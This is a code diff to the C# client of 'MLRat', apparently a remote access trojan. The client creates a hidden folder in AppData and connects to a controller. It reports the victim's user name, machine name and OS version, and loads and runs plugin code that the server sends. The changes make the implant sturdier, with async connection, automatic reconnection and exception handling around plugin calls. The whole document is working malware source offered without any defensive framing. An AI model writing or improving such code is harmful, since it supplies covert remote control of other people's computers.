@@ -1,27 +1,25 @@
-﻿using MLRat.Client;
-using MLRatClient.Networking;
+﻿using MLRatClient.Networking;
 using MLRatClient.Plugin;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
 using System.Reflection;
-using System.Text;
 using System.Threading;
-using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace MLRatClient
 {
     class Program
     {
         private static eSock.Client networkClient;
-        static bool Connected = false;
         private static Dictionary<Guid, MLClientPlugin> LoadedPlugins = new Dictionary<Guid, MLClientPlugin>();
         private static Dictionary<Guid, FileStream> PluginUpdates = new Dictionary<Guid, FileStream>();
         private static string PluginBaseLication;
+        [STAThread]
         static void Main(string[] args)
         {
+            Application.EnableVisualStyles();
             string _ratBase = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                 "MLRat");
             CreateHiddentDirectory(_ratBase);
@@ -35,12 +33,8 @@ namespace MLRatClient
             }
 
             Console.WriteLine("MLRat started");
-            while (true)
-            {
-                if(!Connected)
-                    Connect();
-                Thread.Sleep(5000);
-            }
+            Connect();
+            Application.Run();
         }
 
         static void Connect()
@@ -50,14 +44,26 @@ namespace MLRatClient
             networkClient.BufferSize = 1000000;//1 mb
             networkClient.OnDataRetrieved += networkClient_OnDataRetrieved;
             networkClient.OnDisconnect += networkClient_OnDisconnect;
-            Connected = networkClient.Connect("127.0.0.1", 12345);
-            if (Connected)
+            networkClient.OnConnect += NetworkClient_OnConnect;
+            networkClient.ConnectAsync("127.0.0.1", 12345);
+        }
+
+        private static void NetworkClient_OnConnect(eSock.Client sender, bool success)
+        {
+            if (success)
             {
                 Console.WriteLine("Connected!");
                 foreach (var plugin in LoadedPlugins)
                 {
                     MLClientPlugin _plugin = plugin.Value;
-                    _plugin.ClientPlugin.OnConnect(new MLConnection(_plugin.ClientPluginID, OnSend));
+                    try
+                    {
+                        _plugin.ClientPlugin.OnConnect(new MLConnection(_plugin.ClientPluginID, OnSend));
+                    }
+                    catch (Exception ex)
+                    {
+                        DisplayException(_plugin, ex);
+                    }
                 }
                 networkClient.Send(Guid.Empty, "handshake", string.Format("{0}/{1}", Environment.UserName, Environment.MachineName), Environment.OSVersion.ToString());
                 Console.WriteLine("handshake sent");
@@ -65,20 +71,44 @@ namespace MLRatClient
             else
             {
                 Console.WriteLine("Failed to connect.");
+                Thread.Sleep(5000);
+                Connect();
             }
+                
         }
 
         static void OnSend(MLConnection sender, Guid PluginID, object[] data)
         {
-            networkClient.Send(PluginID, (object) data);
+            try
+            {
+                networkClient.Send(PluginID, (object)data);
+            }
+            catch (Exception ex)
+            {
+                DisplayException(null, ex);
+            }
         }
+
+        static void DisplayException(MLClientPlugin plugin, Exception ex)
+        {
+            if (plugin != null)
+            {
+                Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.Message);
+            }
+            else
+            {
+                Console.WriteLine(ex.ToString());
+            }
+        }
+
 
         static void LoadPlugin(string path)
         {
+            MLClientPlugin _plugin = null;
             try
             {
                 byte[] PluginBytes = File.ReadAllBytes(path);
-                MLClientPlugin _plugin = new MLClientPlugin(PluginBytes);
+                _plugin = new MLClientPlugin(PluginBytes);
                 if (!_plugin.Load())
                     throw new Exception("Failed to load plugin");
                 if (_plugin.ClientPluginID == Guid.Empty)
@@ -92,30 +122,45 @@ namespace MLRatClient
             }
             catch(Exception ex)
             {
-                Console.WriteLine(ex.Message);
+                DisplayException(_plugin, ex);
             }
         }
 
         static void CreateHiddentDirectory(string path)
         {
-            DirectoryInfo di = new DirectoryInfo(path);
-            if (!di.Exists)
+            try
             {
-                di.Create();
-                di.Attributes = FileAttributes.Hidden;
+                DirectoryInfo di = new DirectoryInfo(path);
+                if (!di.Exists)
+                {
+                    di.Create();
+                    di.Attributes = FileAttributes.Hidden;
+                }
+            }
+            catch(Exception ex)
+            {
+                DisplayException(null, ex);
             }
         }
 
 
         static void SendChecksums()
         {
-            Dictionary<Guid, string> Checksums = new Dictionary<Guid, string>();
-            foreach (var plugin in LoadedPlugins)
+            try
             {
-                Checksums.Add(plugin.Value.ClientPluginID, plugin.Value.Checksum);
+                Dictionary<Guid, string> Checksums = new Dictionary<Guid, string>();
+                foreach (var plugin in LoadedPlugins)
+                {
+                    Checksums.Add(plugin.Value.ClientPluginID, plugin.Value.Checksum);
+                }
+                Console.WriteLine("Sent checksums");
+                networkClient.Send(Guid.Empty, "checksums", Checksums);
             }
-            Console.WriteLine("Sent checksums");
-            networkClient.Send(Guid.Empty, "checksums", Checksums);
+            catch(Exception ex)
+            {
+                DisplayException(null, ex);
+            }
+
         }
 
         #region " Network callbacks "
@@ -125,9 +170,17 @@ namespace MLRatClient
             foreach (var plugin in LoadedPlugins)
             {
                 MLClientPlugin _plugin = plugin.Value;
-                _plugin.ClientPlugin.OnDisconnect();
+                try
+                {
+                    _plugin.ClientPlugin.OnDisconnect();
+                }
+                catch(Exception ex)
+                {
+                    DisplayException(_plugin, ex);
+                }
             }
-            Connected = false;
+            Thread.Sleep(5000);
+            Connect();
         }
 
         static void networkClient_OnDataRetrieved(eSock.Client sender, object[] data)
@@ -188,7 +241,15 @@ namespace MLRatClient
 
                 if (LoadedPlugins.ContainsKey(ID))
                 {
-                    LoadedPlugins[ID].ClientPlugin.OnDataRecieved((object[]) data[1]);
+                    try
+                    {
+                        LoadedPlugins[ID].ClientPlugin.OnDataRecieved((object[])data[1]);
+                    }
+                    catch(Exception ex)
+                    {
+                        DisplayException(LoadedPlugins[ID], ex);
+                    }
+
                 }
             }
             catch(Exception ex)
